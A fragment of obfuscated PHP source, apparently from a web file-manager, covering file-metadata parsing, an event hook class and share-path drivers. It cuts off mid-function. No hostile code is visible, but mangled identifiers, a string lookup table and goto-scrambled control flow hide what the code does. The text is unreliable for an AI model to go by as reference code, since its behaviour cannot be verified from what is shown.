($F¨äñº¶÷’[$Eóƒ²ğ»¢Ç[170]] == $Eóƒ²ğ»¢Ç[1613]) { $e¸× Ü›¾² = self::pdfParse($Cî­®§ôãØ); } else { $bİìôğÔå = self::$fileTypeArray[$Eóƒ²ğ»¢Ç[1614]][$F¨äñº¶÷’[$Eóƒ²ğ»¢Ç[170]]]; $fÍøî¦‚º = self::$fileTypeArray[$Eóƒ²ğ»¢Ç[1615]][$bİìôğÔå][$Eóƒ²ğ»¢Ç[1616]]; $C÷¤Ïç½Ùù = @$A¶ƒòä‰°µ->analyze($Cî­®§ôãØ, $F¨äñº¶÷’[$Eóƒ²ğ»¢Ç[87]], $F¨äñº¶÷’[$Eóƒ²ğ»¢Ç[38]]); $e¸× Ü›¾² = self::parseData($C÷¤Ïç½Ùù, $fÍøî¦‚º, $F¨äñº¶÷’); } } } catch (Exception $e©á¦•) { $e¸× Ü›¾² = array($Eóƒ²ğ»¢Ç[380] => $bİìôğÔå); } if (!$e¸× Ü›¾²) { return; } goto AíªÒÓÛµ; b‚¿µ™é…: if (!$F¨äñº¶÷’ || $F¨äñº¶÷’[$Eóƒ²ğ»¢Ç[39]] != $Eóƒ²ğ»¢Ç[177]) { return; } if (!self::support($F¨äñº¶÷’[$Eóƒ²ğ»¢Ç[170]]) || isset($F¨äñº¶÷’[$Eóƒ²ğ»¢Ç[434]])) { return; } $Cî­®§ôãØ = $Eóƒ²ğ»¢Ç[1610] . $F¨äñº¶÷’[$Eóƒ²ğ»¢Ç[85]]; goto bø‚´„¼×ê; C­”İÅ¨ŞÊ: } public static function support($B¼è®ÜÃŸœ) { goto B¶Ëœ„¢¯; D¯´Óº²¶¸: $B—±µôì = array($EôÌóë—[1613], $EôÌóë—[1611]); if (in_array($B¼è®ÜÃŸœ, $B—±µôì)) { return !0; } if (isset(self::$fileTypeArray[$EôÌóë—[1614]][$B¼è®ÜÃŸœ])) { return !0; } goto a‡·ˆ‹ª×‚; a‡·ˆ‹ª×‚: return !1; goto a¯®á²«ˆ; B¶Ëœ„¢¯: $EôÌóë— =& $_SERVER[©]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $B¼è®ÜÃŸœ = strtolower($B¼è®ÜÃŸœ); goto D¯´Óº²¶¸; a¯®á²«ˆ: } private static function parseData($D“ƒˆÊ’´Í, $D¬ÇÆÊ¼ŠÑ, $C¤”÷´È) { $bñ‰¡Ò­™ =& $_SERVER[©]; $BŒºİğº‡ù = $D“ƒˆÊ’´Í[$bñ‰¡Ò­™[1617]]; $DŞĞ¶ê†¼á = array(); foreach ($D¬ÇÆÊ¼ŠÑ as $cƒÁ‹ŸêŠŞ => $C„¤âÈ) { foreach ($C„¤âÈ as $F¾Ê¬½Î…ª) { if (is_array($F¾Ê¬½Î…ª)) { $eæ„àª¤‹š = self::parseData($D“ƒˆÊ’´Í, $C„¤âÈ, $C¤”÷´È); if ($eæ„àª¤‹š) { $DŞĞ¶ê†¼á[$cƒÁ‹ŸêŠŞ] = $eæ„àª¤‹š; } break; } $E·…¶™’†½ = str_replace($bñ‰¡Ò­™[1387], $BŒºİğº‡ù, $F¾Ê¬½Î…ª); $eæ„àª¤‹š = _get($D“ƒˆÊ’´Í, $E·…¶™’†½); $eæ„àª¤‹š = is_array($eæ„àª¤‹š) ? $eæ„àª¤‹š[0] : $eæ„àª¤‹š; if ($eæ„àª¤‹š) { break; } } if ($eæ„àª¤‹š || $eæ„àª¤‹š === 0 || $eæ„àª¤‹š === !1) { $eæ„àª¤‹š = self::valueReset($F¾Ê¬½Î…ª, $eæ„àª¤‹š, $cƒÁ‹ŸêŠŞ); if ($eæ„àª¤‹š !== null) { $DŞĞ¶ê†¼á[$cƒÁ‹ŸêŠŞ] = $eæ„àª¤‹š; } } } $DŞĞ¶ê†¼á = self::valueResetAll($DŞĞ¶ê†¼á, $C¤”÷´È); return $DŞĞ¶ê†¼á; } private static function psdParse($D÷âÌçÃº…) { $a÷†ÑÈ =& $_SERVER[©]; if (IO::fileSubstr($D÷âÌçÃº…, 0, 4) != $a÷†ÑÈ[1618]) { return !1; } $f¡½ÃŞĞÂ = getImageSize($D÷âÌçÃº…, $cóƒÂ ½á·); if (!$f¡½ÃŞĞÂ) { return; } $b‰¯èˆÜ°Œ = array($a÷†ÑÈ[1533] => $f¡½ÃŞĞÂ[0], $a÷†ÑÈ[1535] => $f¡½ÃŞĞÂ[1]); return $b‰¯èˆÜ°Œ; } private static function pdfParse($bùäæì¡ÑÆ) { return FileParsePdf::parse($bùäæì¡ÑÆ); } private static function fileTypeParse() { $b…Œ–ŸÖ‹Ÿ =& $_SERVER[©]; $E×Á£õ²ßå = self::fileTypeArray(); $A±å‰æˆ¸Ó = array(); foreach ($E×Á£õ²ßå as $c‹‹÷Àµ—Ì => $e´ªÒ°«¯é) { $bó¶á•¶ŞÅ = _get($e´ªÒ°«¯é, $b…Œ–ŸÖ‹Ÿ[170], $b…Œ–ŸÖ‹Ÿ[43]); $fõùš‰ğŸ§ = is_string($bó¶á•¶ŞÅ) ? explode($b…Œ–ŸÖ‹Ÿ[57], $bó¶á•¶ŞÅ) : $bó¶á•¶ŞÅ; if (!$fõùš‰ğŸ§) { continue; } foreach ($fõùš‰ğŸ§ as $bó¶á•¶ŞÅ) { $bó¶á•¶ŞÅ = strtolower(trim($bó¶á•¶ŞÅ)); if (!$bó¶á•¶ŞÅ) { continue; } $A±å‰æˆ¸Ó[$bó¶á•¶ŞÅ] = $c‹‹÷Àµ—Ì; } $E×Á£õ²ßå[$c‹‹÷Àµ—Ì][$b…Œ–ŸÖ‹Ÿ[170]] = array_keys($A±å‰æˆ¸Ó); $E×Á£õ²ßå[$c‹‹÷Àµ—Ì][$b…Œ–ŸÖ‹Ÿ[1616]] = self::parseKeyMap($e´ªÒ°«¯é[$b…Œ–ŸÖ‹Ÿ[1616]]); } return array($b…Œ–ŸÖ‹Ÿ[1615] => $E×Á£õ²ßå, $b…Œ–ŸÖ‹Ÿ[1614] => $A±å‰æˆ¸Ó); } private static function parseKeyMap($BïƒŠ¸á•º) { $CÇ‘åÍÓÚ =& $_SERVER[©]; foreach ($BïƒŠ¸á•º as $dÆï‰ÎŒñ => $FŸ†ÕøŸÙ”) { if (is_array($FŸ†ÕøŸÙ”)) { $EÍéÂ™šÅ˜ = self::parseKeyMap($FŸ†ÕøŸÙ”); if ($EÍéÂ™šÅ˜) { $BïƒŠ¸á•º[$dÆï‰ÎŒñ] = $EÍéÂ™šÅ˜; } continue; } $c¯›æğÎŠ = explode($CÇ‘åÍÓÚ[57], $FŸ†ÕøŸÙ”); $BÒÇĞ‘µÉ­ = array(); foreach ($c¯›æğÎŠ as $a£õÌé®„Å) { $a£õÌé®„Å = trim($a£õÌé®„Å); if (!$a£õÌé®„Å) { continue; } if (preg_match($CÇ‘åÍÓÚ[1619], $a£õÌé®„Å, $BøÆƒÜÊ)) { $fƒ÷­‚Ø¹Î = explode($CÇ‘åÍÓÚ[280], $BøÆƒÜÊ[1]); foreach ($fƒ÷­‚Ø¹Î as $FÛ¢‰ÄÉ¢˜) { $BÒÇĞ‘µÉ­[] = str_replace($BøÆƒÜÊ[0], $FÛ¢‰ÄÉ¢˜, $a£õÌé®„Å); } } else { $BÒÇĞ‘µÉ­[] = $a£õÌé®„Å; } } $BïƒŠ¸á•º[$dÆï‰ÎŒñ] = $BÒÇĞ‘µÉ­; } return $BïƒŠ¸á•º; } private static function valueResetAll($fºÏğº‡ªÎ, $c²—×Àóœ) { goto cà±õÄ–; d’«»²ôœÁ: $f‹®ØÓŒ» = _get($fºÏğº‡ªÎ, $BÌ“ˆ»Ğõ£[1632], $BÌ“ˆ»Ğõ£[43]); $bĞ³¿Ÿ¼µ = $A«÷¹ğÎÓæ . $få•è‚œ•¤ . $f‹®ØÓŒ»; if ($bĞ³¿Ÿ¼µ && get_charset($bĞ³¿Ÿ¼µ) != $BÌ“ˆ»Ğõ£[335]) { $fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1629]][$BÌ“ˆ»Ğõ£[1338]] = iconv_to($fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1629]][$BÌ“ˆ»Ğõ£[1338]], get_charset($bĞ³¿Ÿ¼µ), $BÌ“ˆ»Ğõ£[335]); $fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1629]][$BÌ“ˆ»Ğõ£[1633]] = iconv_to($fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1629]][$BÌ“ˆ»Ğõ£[1633]], get_charset($bĞ³¿Ÿ¼µ), $BÌ“ˆ»Ğõ£[335]); $fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1629]][$BÌ“ˆ»Ğõ£[1634]] = iconv_to($fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1629]][$BÌ“ˆ»Ğõ£[1634]], get_charset($bĞ³¿Ÿ¼µ), $BÌ“ˆ»Ğõ£[335]); } goto FöÛí¾ÇÜé; B‹À¶¡à¤: if ($Ağèƒ‡„Û÷) { $AĞ¤¹ÒĞºÚ = IO_PATH_SYSTEM_TEMP . $BÌ“ˆ»Ğõ£[1625] . KodIO::hashPath($c²—×Àóœ) . $BÌ“ˆ»Ğõ£[1626]; $fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1627]] = Action($BÌ“ˆ»Ğõ£[1628])->pluginCacheFileSet($AĞ¤¹ÒĞºÚ, $Ağèƒ‡„Û÷); unset($fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1629]][$BÌ“ˆ»Ğõ£[1612]]); } $A«÷¹ğÎÓæ = _get($fºÏğº‡ªÎ, $BÌ“ˆ»Ğõ£[1630], $BÌ“ˆ»Ğõ£[43]); $få•è‚œ•¤ = _get($fºÏğº‡ªÎ, $BÌ“ˆ»Ğõ£[1631], $BÌ“ˆ»Ğõ£[43]); goto d’«»²ôœÁ; FöÛí¾ÇÜé: return $fºÏğº‡ªÎ; goto dŒ±„—ŸµÜ; cà±õÄ–: $BÌ“ˆ»Ğõ£ =& $_SERVER[©]; if (isset($fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1620]])) { $cŞõÃ¦Ç‡Ö = ceil($fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1620]]); $a•Š§º×¿ø = intval($cŞõÃ¦Ç‡Ö / 3600); $fÀí¡Ûì©ï = intval(($cŞõÃ¦Ç‡Ö - $a•Š§º×¿ø * 3600) / 60); $EÓ¾‹ŠÓÄò = $cŞõÃ¦Ç‡Ö % 60; $fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1621]] = sprintf($BÌ“ˆ»Ğõ£[1622], $a•Š§º×¿ø, $fÀí¡Ûì©ï, $EÓ¾‹ŠÓÄò); if ($a•Š§º×¿ø == 0) { $fºÏğº‡ªÎ[$BÌ“ˆ»Ğõ£[1621]] = sprintf($BÌ“ˆ»Ğõ£[1623], $fÀí¡Ûì©ï, $EÓ¾‹ŠÓÄò); } } $Ağèƒ‡„Û÷ = _get($fºÏğº‡ªÎ, $BÌ“ˆ»Ğõ£[1624]); goto B‹À¶¡à¤; dŒ±„—ŸµÜ: } private static function valueReset($AË÷òÕª–‚, $C»ö¡ ¬¿, $d¬­É¬¸²“) { $C°Ã…è¨¡ =& $_SERVER[©]; $eï—±ÚƒˆÔ = $C°Ã…è¨¡[1550]; switch ($AË÷òÕª–‚) { case $C°Ã…è¨¡[1635]: $C»ö¡ ¬¿ = $C»ö¡ ¬¿ == $C°Ã…è¨¡[93] ? $C°Ã…è¨¡[1636] : $C°Ã…è¨¡[1637]; break; case $C°Ã…è¨¡[1638]: $C»ö¡ ¬¿ = $C»ö¡ ¬¿ ? $C»ö¡ ¬¿ : null; break; default: break; } switch ($d¬­É¬¸²“) { case $C°Ã…è¨¡[1639]: $C»ö¡ ¬¿ = round($C»ö¡ ¬¿, 2); break; case $C°Ã…è¨¡[197]: case $C°Ã…è¨¡[117]: if ($C»ö¡ ¬¿ < 0) { $C»ö¡ ¬¿ = null; } else { if (is_numeric($C»ö¡ ¬¿)) { $C»ö¡ ¬¿ = date($eï—±ÚƒˆÔ, $C»ö¡ ¬¿); } } break; default: break; } return $C»ö¡ ¬¿; } private static function fileTypeArray() { $bËí«‘†ÌÀ =& $_SERVER[©]; return array($bËí«‘†ÌÀ[1612] => array($bËí«‘†ÌÀ[170] => $bËí«‘†ÌÀ[1640] . $bËí«‘†ÌÀ[1641], $bËí«‘†ÌÀ[1616] => array($bËí«‘†ÌÀ[1533] => $bËí«‘†ÌÀ[1642], $bËí«‘†ÌÀ[1535] => $bËí«‘†ÌÀ[1643], $bËí«‘†ÌÀ[1644] => $bËí«‘†ÌÀ[1645], $bËí«‘†ÌÀ[1646] => $bËí«‘†ÌÀ[1647], $bËí«‘†ÌÀ[197] => $bËí«‘†ÌÀ[1648], $bËí«‘†ÌÀ[117] => $bËí«‘†ÌÀ[1649], $bËí«‘†ÌÀ[1650] => $bËí«‘†ÌÀ[1651], $bËí«‘†ÌÀ[1652] => $bËí«‘†ÌÀ[1653], $bËí«‘†ÌÀ[1654] => $bËí«‘†ÌÀ[1655], $bËí«‘†ÌÀ[1656] => $bËí«‘†ÌÀ[1657], $bËí«‘†ÌÀ[1658] => $bËí«‘†ÌÀ[1659], $bËí«‘†ÌÀ[1660] => $bËí«‘†ÌÀ[1661], $bËí«‘†ÌÀ[1662] => $bËí«‘†ÌÀ[1663], $bËí«‘†ÌÀ[1664] => array($bËí«‘†ÌÀ[1665] => $bËí«‘†ÌÀ[1666], $bËí«‘†ÌÀ[1667] => $bËí«‘†ÌÀ[1668], $bËí«‘†ÌÀ[1669] => $bËí«‘†ÌÀ[1670]), $bËí«‘†ÌÀ[1671] => $bËí«‘†ÌÀ[1672], $bËí«‘†ÌÀ[1673] => $bËí«‘†ÌÀ[1674], $bËí«‘†ÌÀ[1675] => $bËí«‘†ÌÀ[1676], $bËí«‘†ÌÀ[1677] => $bËí«‘†ÌÀ[1678], $bËí«‘†ÌÀ[1679] => array($bËí«‘†ÌÀ[1680] => $bËí«‘†ÌÀ[1681], $bËí«‘†ÌÀ[1682] => $bËí«‘†ÌÀ[1683], $bËí«‘†ÌÀ[1684] => $bËí«‘†ÌÀ[1685], $bËí«‘†ÌÀ[1686] => $bËí«‘†ÌÀ[1687], $bËí«‘†ÌÀ[1688] => $bËí«‘†ÌÀ[1689], $bËí«‘†ÌÀ[1690] => $bËí«‘†ÌÀ[1691], $bËí«‘†ÌÀ[1692] => $bËí«‘†ÌÀ[1693], $bËí«‘†ÌÀ[1694] => $bËí«‘†ÌÀ[1695], $bËí«‘†ÌÀ[1696] => $bËí«‘†ÌÀ[1697], $bËí«‘†ÌÀ[1698] => $bËí«‘†ÌÀ[1699], $bËí«‘†ÌÀ[1700] => $bËí«‘†ÌÀ[1701]))), $bËí«‘†ÌÀ[1702] => array($bËí«‘†ÌÀ[170] => $bËí«‘†ÌÀ[1703] . $bËí«‘†ÌÀ[1704], $bËí«‘†ÌÀ[1616] => array($bËí«‘†ÌÀ[1620] => $bËí«‘†ÌÀ[1705], $bËí«‘†ÌÀ[197] => $bËí«‘†ÌÀ[1706], $bËí«‘†ÌÀ[117] => $bËí«‘†ÌÀ[1707], $bËí«‘†ÌÀ[1652] => $bËí«‘†ÌÀ[1708], $bËí«‘†ÌÀ[1709] => $bËí«‘†ÌÀ[1710], $bËí«‘†ÌÀ[1711] => $bËí«‘†ÌÀ[1638], $bËí«‘†ÌÀ[1712] => $bËí«‘†ÌÀ[1713], $bËí«‘†ÌÀ[1714] => $bËí«‘†ÌÀ[1715], $bËí«‘†ÌÀ[1716] => $bËí«‘†ÌÀ[1717], $bËí«‘†ÌÀ[1629] => array($bËí«‘†ÌÀ[1338] => $bËí«‘†ÌÀ[1718], $bËí«‘†ÌÀ[1633] => $bËí«‘†ÌÀ[1719], $bËí«‘†ÌÀ[1634] => $bËí«‘†ÌÀ[1720], $bËí«‘†ÌÀ[1721] => $bËí«‘†ÌÀ[1722], $bËí«‘†ÌÀ[1723] => $bËí«‘†ÌÀ[1724], $bËí«‘†ÌÀ[1725] => $bËí«‘†ÌÀ[1726], $bËí«‘†ÌÀ[1612] => $bËí«‘†ÌÀ[1727]))), $bËí«‘†ÌÀ[1728] => array($bËí«‘†ÌÀ[170] => $bËí«‘†ÌÀ[1729] . $bËí«‘†ÌÀ[1730], $bËí«‘†ÌÀ[1616] => array($bËí«‘†ÌÀ[1533] => $bËí«‘†ÌÀ[1731], $bËí«‘†ÌÀ[1535] => $bËí«‘†ÌÀ[1732], $bËí«‘†ÌÀ[1620] => $bËí«‘†ÌÀ[1705], $bËí«‘†ÌÀ[197] => $bËí«‘†ÌÀ[1733], $bËí«‘†ÌÀ[117] => $bËí«‘†ÌÀ[1734], $bËí«‘†ÌÀ[1639] => $bËí«‘†ÌÀ[1735], $bËí«‘†ÌÀ[1716] => $bËí«‘†ÌÀ[1736], $bËí«‘†ÌÀ[1712] => $bËí«‘†ÌÀ[1737], $bËí«‘†ÌÀ[1652] => $bËí«‘†ÌÀ[1738], $bËí«‘†ÌÀ[1702] => array($bËí«‘†ÌÀ[1711] => $bËí«‘†ÌÀ[1638], $bËí«‘†ÌÀ[1739] => $bËí«‘†ÌÀ[1740], $bËí«‘†ÌÀ[1709] => $bËí«‘†ÌÀ[1710], $bËí«‘†ÌÀ[1716] => $bËí«‘†ÌÀ[1717], $bËí«‘†ÌÀ[1712] => $bËí«‘†ÌÀ[1741], $bËí«‘†ÌÀ[1714] => $bËí«‘†ÌÀ[1715]))), $bËí«‘†ÌÀ[1742] => array($bËí«‘†ÌÀ[1616] => array($bËí«‘†ÌÀ[1743] => $bËí«‘†ÌÀ[1744], $bËí«‘†ÌÀ[1745] => $bËí«‘†ÌÀ[1746])), $bËí«‘†ÌÀ[1747] => array($bËí«‘†ÌÀ[1616] => array())); } } class Hook { private static $events = array(); public static function get($BéÔÌã×Ğ½ = false) { if (!$BéÔÌã×Ğ½) { return self::$events; } else { return self::$events[$BéÔÌã×Ğ½]; } } public static function apply($FŸßáàœ§·, $cÌä®À‰ÃÅ = array()) { $Dòß“„Á = ActionApply($FŸßáàœ§·, $cÌä®À‰ÃÅ); if (is_string($FŸßáàœ§·)) { Hook::trigger($FŸßáàœ§·); } return $Dòß“„Á; } public static function bind($A¼ÙøÃ™ùĞ, $a’ÙîñæÒ, $bÑ†×àªˆ¶ = false) { $e¬†˜Õˆõ± =& $_SERVER[©]; if (!isset(self::$events[$A¼ÙøÃ™ùĞ])) { self::$events[$A¼ÙøÃ™ùĞ] = array(); } self::$events[$A¼ÙøÃ™ùĞ][] = array($e¬†˜Õˆõ±[1748] => $a’ÙîñæÒ, $e¬†˜Õˆõ±[1749] => $bÑ†×àªˆ¶, $e¬†˜Õˆõ±[1750] => 0); } public static function once($FÇ†æ©¬¦¬, $A ŞÕˆ»°Ù) { self::bind($FÇ†æ©¬¦¬, $A ŞÕˆ»°Ù, !0); } public static function unbind($BŞ±ïïâ–, $e›°Éó‹¡İ = false) { if (!$e›°Éó‹¡İ) { self::$events[$BŞ±ïïâ–] = array(); return; } $AÚÆ×¶¸ = self::$events[$BŞ±ïïâ–]; self::$events[$BŞ±ïïâ–] = array(); if (!is_array($AÚÆ×¶¸)) { return; } for ($EÍ¤—Îß = 0; $EÍ¤—Îß < count($AÚÆ×¶¸); $EÍ¤—Îß++) { if ($AÚÆ×¶¸[$EÍ¤—Îß][$_SERVER[©][1748]] == $e›°Éó‹¡İ) { continue; } self::$events[$BŞ±ïïâ–][] = $AÚÆ×¶¸[$EÍ¤—Îß]; } } public static function filter($fºÕ©ÙÏÙ, $bÉ‡’êçÒ¾) { goto AÇŠÇâ¾Ü„; AÇŠÇâ¾Ü„: $E…Œåáª¦ä =& $_SERVER[©]; $F…ï“´Œ’ = self::$events; if (!isset($F…ï“´Œ’[$fºÕ©ÙÏÙ])) { return $bÉ‡’êçÒ¾; } goto Dß’Ã­—Šä; cãØ‰ªœŞ: for ($Fáò‡Ï¢‡– = 0; $Fáò‡Ï¢‡– < count($e²¤‘äùÌ“); $Fáò‡Ï¢‡–++) { $E¬£†³ƒ¨ = $e²¤‘äùÌ“[$Fáò‡Ï¢‡–]; if ($E¬£†³ƒ¨[$E…Œåáª¦ä[1749]] && $E¬£†³ƒ¨[$E…Œåáª¦ä[1750]] > 1) { continue; } self::$events[$fºÕ©ÙÏÙ][$Fáò‡Ï¢‡–][$E…Œåáª¦ä[1750]] = $E¬£†³ƒ¨[$E…Œåáª¦ä[1750]] + 1; $BßéÌÀ¥¥Ò = self::apply($E¬£†³ƒ¨[$E…Œåáª¦ä[1748]], array($DÁ¯¿¬Ëùğ)); if (gettype($BßéÌÀ¥¥Ò) == gettype($DÁ¯¿¬Ëùğ)) { $DÁ¯¿¬Ëùğ = $BßéÌÀ¥¥Ò; } } return $DÁ¯¿¬Ëùğ; goto E†ÖÅùÆ“ç; Dß’Ã­—Šä: $e²¤‘äùÌ“ = $F…ï“´Œ’[$fºÕ©ÙÏÙ]; $DÁ¯¿¬Ëùğ = $bÉ‡’êçÒ¾; if (!is_array($e²¤‘äùÌ“) || count($e²¤‘äùÌ“) == 0) { return $DÁ¯¿¬Ëùğ; } goto cãØ‰ªœŞ; E†ÖÅùÆ“ç: } public static function trigger($A›âìÍÁ¾°) { goto dáîªî«í½; d¶ÈèïŸİ: if (!isset($cÇÑŒó¥ä[$A›âìÍÁ¾°])) { return $dÀˆ­è†ó; } $Dù×’Å—Øâ = $cÇÑŒó¥ä[$A›âìÍÁ¾°]; if (!is_array($Dù×’Å—Øâ) || count($Dù×’Å—Øâ) == 0) { return $dÀˆ­è†ó; } goto C’››´¨ùã; C’››´¨ùã: $aßØ‚Ë«ò = func_get_args(); array_shift($aßØ‚Ë«ò); for ($f©õÍÅ¬ö› = 0; $f©õÍÅ¬ö› < count($Dù×’Å—Øâ); $f©õÍÅ¬ö›++) { $aéßóë»‰‚ = $Dù×’Å—Øâ[$f©õÍÅ¬ö›]; if ($aéßóë»‰‚[$a‚èĞ²¿¤[1749]] && $aéßóë»‰‚[$a‚èĞ²¿¤[1750]] > 1) { continue; } if (defined($a‚èĞ²¿¤[1751]) && GLOBAL_LOG_HOOK) { write_log($A›âìÍÁ¾° . $a‚èĞ²¿¤[1752] . $aéßóë»‰‚[$a‚èĞ²¿¤[1748]], $a‚èĞ²¿¤[1753]); } self::$events[$A›âìÍÁ¾°][$f©õÍÅ¬ö›][$a‚èĞ²¿¤[1750]] = $aéßóë»‰‚[$a‚èĞ²¿¤[1750]] + 1; $bºÀùÁÌ» = self::apply($aéßóë»‰‚[$a‚èĞ²¿¤[1748]], $aßØ‚Ë«ò); if (defined($a‚èĞ²¿¤[1751]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $a‚èĞ²¿¤[1753]); if ($aéßóë»‰‚[$a‚èĞ²¿¤[1750]] == 200) { $dÇœÁÇù¶ = is_array($aéßóë»‰‚[$a‚èĞ²¿¤[1748]]) ? json_encode_force($aéßóë»‰‚[$a‚èĞ²¿¤[1748]]) : $aéßóë»‰‚[$a‚èĞ²¿¤[1748]]; write_log($a‚èĞ²¿¤[1754] . $A›âìÍÁ¾° . $a‚èĞ²¿¤[1755] . $dÇœÁÇù¶, $a‚èĞ²¿¤[1756]); } } $dÀˆ­è†ó = is_null($bºÀùÁÌ») ? $dÀˆ­è†ó : $bºÀùÁÌ»; } goto C‘„ªÖ†—»; dáîªî«í½: $a‚èĞ²¿¤ =& $_SERVER[©]; $cÇÑŒó¥ä = self::$events; $dÀˆ­è†ó = !1; goto d¶ÈèïŸİ; C‘„ªÖ†—»: return $dÀˆ­è†ó; goto bè’—Ú‰Ç; bè’—Ú‰Ç: } } goto D®Ì²”öÕ¾; d ï‹³±Ç…: define($_SERVER[©][1930], 2); define($_SERVER[©][1931], 3); define($_SERVER[©][1932], 4); goto aì—¼°•„; f£Ôö—›ˆÂ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($F‚°Ø§„Á) { $this->pathParse = $F‚°Ø§„Á; $this->model = Model($_SERVER[©][1114]); } public function getPathOuter($c‘ÒÖˆïˆá) { $a¤ã“Óª¸ø =& $_SERVER[©]; if (!$c‘ÒÖˆïˆá) { return $c‘ÒÖˆïˆá; } $e–×Ù¨À‹ = $this->parse($c‘ÒÖˆïˆá); return trim(KodIO::makeShare($this->pathParse[$a¤ã“Óª¸ø[375]], $e–×Ù¨À‹[$a¤ã“Óª¸ø[375]]), $a¤ã“Óª¸ø[18]); } protected function infoParse($F…ãª³ó´, $a–‡¨½äÌ = false, $E™Ñ²¥ˆ”â = false) { $BÔ¬ğĞÒ™Ö =& $_SERVER[©]; $Cï«…·Ó»Ö = $this->pathParse[$BÔ¬ğĞÒ™Ö[375]]; $E³Êƒ…Æá³ = trim($this->pathParse[$BÔ¬ğĞÒ™Ö[1009]], $BÔ¬ğĞÒ™Ö[18]); return Action($BÔ¬ğĞÒ™Ö[1121])->sharePathInfo($Cï«…·Ó»Ö, $E³Êƒ…Æá³); } public function infoFull($FˆÒÈÛŞ—ö) { $e¿¥‹à¢ÒÕ =& $_SERVER[©]; $AÚÁˆ£ÁĞ‰ = explode($e¿¥‹à¢ÒÕ[18], trim($FˆÒÈÛŞ—ö, $e¿¥‹à¢ÒÕ[18])); if (count($AÚÁˆ£ÁĞ‰) > 1) { $b£×„ƒ²…Á = implode($e¿¥‹à¢ÒÕ[18], array_splice($AÚÁˆ£ÁĞ‰, 1)); $E˜ÚŞ’’ö— = $this->model->pathInfoByPath($AÚÁˆ£ÁĞ‰[0], $b£×„ƒ²…Á); if (!$E˜ÚŞ’’ö—) { return !1; } $this->pathParse[$e¿¥‹à¢ÒÕ[1009]] = $E˜ÚŞ’’ö—[$e¿¥‹à¢ÒÕ[377]]; } return $this->infoParse($FˆÒÈÛŞ—ö); } public function listAll($B˜âÉÑ²‰) { goto aè°ëâæç; e…ƒ‘²¡…: foreach ($aÌÏÖÀã®À as &$F¨­¼ˆ­•¦) { check_abort(); $F¨­¼ˆ­•¦[$f‹ˆ˜÷‡ø[399]] = $eªï’ù„ïá->_shareItemeParse($F¨­¼ˆ­•¦[$f‹ˆ˜÷‡ø[399]], $c§ƒ¯¿À¼º); } return $aÌÏÖÀã®À; goto E’ì®¬®ä‚; c¹áÖ©Ó³¿: $aÌÏÖÀã®À = $this->model->listAll($B˜âÉÑ²‰); $c§ƒ¯¿À¼º = Model($f‹ˆ˜÷‡ø[544])->getInfo($EÄ¤èë¯Ô[$f‹ˆ˜÷‡ø[449]]); $eªï’ù„ïá = Action($f‹ˆ˜÷‡ø[1121]); goto e…ƒ‘²¡…; aè°ëâæç: $f‹ˆ˜÷‡ø =& $_SERVER[©]; $EÄ¤èë¯Ô = IO::info($this->pathParse[$f‹ˆ˜÷‡ø[85]]); if (!$EÄ¤èë¯Ô) { return array(); } goto c¹áÖ©Ó³¿; E’ì®¬®ä‚: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($b±ƒñ¯Ö) { $this->pathParse = $b±ƒñ¯Ö; $this->model = Model($_SERVER[©][1114]); } protected function infoParse($d†¯È±ßÑ, $B‚¹Ş˜¥ä÷ = false, $b–…‹â²Ø° = false) { $B‚ÖÑ÷áŠë =& $_SERVER[©]; return Action($B‚ÖÑ÷áŠë[1015])->sharePathInfo($this->pathParse[$B‚ÖÑ÷áŠë[85]], !0); } public function listPath($Eí‚•©Îî, $Bã˜’²³ùÈ = false) { $a»º¿ˆà–Û =& $_SERVER[©]; $báùš¯”‹¤ = parent::listPath($Eí‚•©Îî, $Bã˜’²³ùÈ); foreach ($báùš¯”‹¤ as $AäÕ–›êØ¿ => $DÀŸÃªåĞ°) { if (!in_array($AäÕ–›êØ¿, array($a»º¿ˆà–Û[83], $a»º¿ˆà–Û[84]))) { continue; } foreach ($DÀŸÃªåĞ° as $CÏ¶¸ºÒ° => $A¨Óâƒø) { $báùš¯”‹¤[$AäÕ–›êØ¿][$CÏ¶¸ºÒ°] = Action($a»º¿ˆà–Û[1015])->shareItemInfo($A¨Óâƒø); } } return $báùš¯”‹¤; } public function listAll($e‚Â‹ÀĞÈ¡) { $eŒ‡ÇšßÜ‚ =& $_SERVER[©]; $D‰®‡±àïã = IO::info($this->pathParse[$eŒ‡ÇšßÜ‚[85]]); if (!$D‰®‡±àïã) { return array(); } $a½‰äÀµ‚² = $this->model->listAll($e‚Â‹ÀĞÈ¡); foreach ($a½‰äÀµ‚² as &$A–ôñËë«) { $A–ôñËë«[$eŒ‡ÇšßÜ‚[399]] = Action($eŒ‡ÇšßÜ‚[1015])->shareItemInfo($A–ôñËë«[$eŒ‡ÇšßÜ‚[399]]); } return $a½‰äÀµ‚²; } } class PathDriverDriverShareItem { public function __construct($F§åæõÖ¡ˆ) { $this->pathParse = $F§åæõÖ¡ˆ; } public function __call($B¯áİµ‚Áñ, $eÅØçäµÜ˜) { $FŞ‡îöğ« =& $_SERVER[©]; if (method_exists($this, $B¯áİµ‚Áñ)) { return; } $Bî‹ªÁØ“ = call_user_func_array(array($FŞ‡îöğ«[1122], $B¯áİµ‚Áñ), $eÅØçäµÜ˜); $aìµêˆ÷– = array($FŞ‡îöğ«[1123], $FŞ‡îöğ«[1124], $FŞ‡îöğ«[1125], $FŞ‡îöğ«[1126], $FŞ‡îöğ«[498], $FŞ‡îöğ«[500], $FŞ‡îöğ«[1127], $FŞ‡îöğ«[113], $FŞ‡îöğ«[1128], $FŞ‡îöğ«[1129]); if (in_array($B¯áİµ‚Áñ, $aìµêˆ÷–)) { $Bî‹ªÁØ“ = $this->getPathOuter($Bî‹ªÁØ“); } return $Bî‹ªÁØ“; } public function copy($Dæå’´»ŒÇ, 